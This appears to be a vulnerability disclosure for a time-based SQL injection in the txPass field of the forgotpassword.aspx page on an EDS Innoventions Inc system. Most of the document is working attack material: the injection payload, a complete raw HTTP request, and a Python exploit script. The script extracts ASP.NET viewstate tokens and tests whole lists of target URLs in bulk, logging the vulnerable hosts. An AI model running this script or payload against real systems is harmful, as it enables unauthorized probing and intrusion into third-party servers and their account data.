### EDS INNOVENTIONS INC There is sql injection on a system.

`/forgotpassword.aspx` At the password retrieval place, enter payload`-1';waitfor delay '0:0:5' -- `the page will show a delay of about 5 seconds



![image-20240716142407768](https://lw-picgo.oss-cn-chengdu.aliyuncs.com/img/image-20240716142407768.png)

txPass parameter

```
POST /forgotpassword.aspx HTTP/1.1
Host: 127.0.0.1
Cookie: ASP.NET_SessionId=5sw4g3dz34y5q2pxl4ds4kbe
Content-Length: 576
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close

__EVENTTARGET=btnToSendPassword&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTgwMjM5ODI4OQ9kFgICAw9kFgQCCw9kFgICAQ8PFgIeBFRleHQFWFRoZSBQSU4geW91IGVudGVyZWQgZG9lcyBub3QgZXhpc3RzLiBQbGVhc2UgdHJ5IGFnYWluIChtYWtlIHN1cmUgeW91ciBjYXBzIGxvY2sgaXMgb2ZmKS5kZAINDw8WAh8ABREgVmVyc2lvbiAxMS4wNy4yMmRkZPmy7d%2FmX5CcZWxUd3X304Rv%2Bm0VeN0b2DbszOHl4KvB&__VIEWSTATEGENERATOR=C633E78B&__EVENTVALIDATION=%2FwEdAASzB05bCdNEjo5Ltn5zYxOsgqEZDZ2qwo79CpW61LHFbJN%2F5rzKV6h6tcsQSqqgSNUF4OzZ%2BpxXKpUbvGC6yZMf6TIXzsZF0%2BwNE3K8oPFYFQcdTiYqzi%2FHUJoS8AecOJ0%3D&txPass=-1%27%3Bwaitfor+delay+%270%3A0%3A5%27+--
```

exp

```
import requests
import re
import argparse
import time
from urllib.parse import urlencode
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress only the InsecureRequestWarning from urllib3 needed for ignoring SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def send_request(url, data):

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    #proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
    start_time = time.time()
    response = requests.post(url, headers=headers, data=data, verify=False)
    end_time = time.time()

    duration = end_time - start_time
    return response, duration

def extract_values(response_content):
    viewstate_match = re.search(r'__VIEWSTATE" value="([^"]+)"', response_content)
    viewstategenerator_match = re.search(r'__VIEWSTATEGENERATOR" value="([^"]+)"', response_content)
    eventvalidation_match = re.search(r'__EVENTVALIDATION" value="([^"]+)"', response_content)

    if viewstate_match and viewstategenerator_match and eventvalidation_match:
        return {
            '__VIEWSTATE': viewstate_match.group(1),
            '__VIEWSTATEGENERATOR': viewstategenerator_match.group(1),
            '__EVENTVALIDATION': eventvalidation_match.group(1)
        }

    return None

def process_url(url):
    first_request_data = ''
    second_request_data = ''


    first_response, _ = send_request(f'{url}/Forgotpassword.aspx', first_request_data)
    first_response_content = first_response.text
    

    extracted_values = extract_values(first_response_content)

    if extracted_values:

        encoded_values = {key: urlencode({key: value}) for key, value in extracted_values.items()}


        second_request_data = f'__EVENTTARGET=btnToSendPassword&__EVENTARGUMENT=&{encoded_values["__VIEWSTATE"]}&{encoded_values["__VIEWSTATEGENERATOR"]}&{encoded_values["__EVENTVALIDATION"]}&txPass=-1\';WAITFOR DELAY \'0:0:7\'--'


        #print(f'\n[Second Request]\nURL: {url}/Forgotpassword.aspx\nData: {second_request_data}')


        second_response, duration = send_request(f'{url}/Forgotpassword.aspx', second_request_data)
        second_response_content = second_response.text


        #print(f'\n[Second Response]\n{second_response_content}\n')


        if duration >= 5:
            print(f'Vulnerability detected at {url} - Response time greater than 5 seconds')
            with open('ok.txt', 'a') as Ph:
            	Ph.write(url +'\n')            
        else:
            print(f'No vulnerability detected at {url}')

def main():
    parser = argparse.ArgumentParser(description='Nuclei-like script for dynamic values extraction and subsequent request.')
    parser.add_argument('-u', '--url', help='Single target URL')
    parser.add_argument('-l', '--url-list', help='File containing list of URLs')

    args = parser.parse_args()

    if args.url:
        process_url(args.url)
    elif args.url_list:
        with open(args.url_list, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
            	try:
                	process_url(url)
            	except Exception as e:
                	print(f'Error at {url}')
                	continue
    else:
        print("Please provide either -u for a single URL or -l for a URL list.")

if __name__ == "__main__":
    main()

```

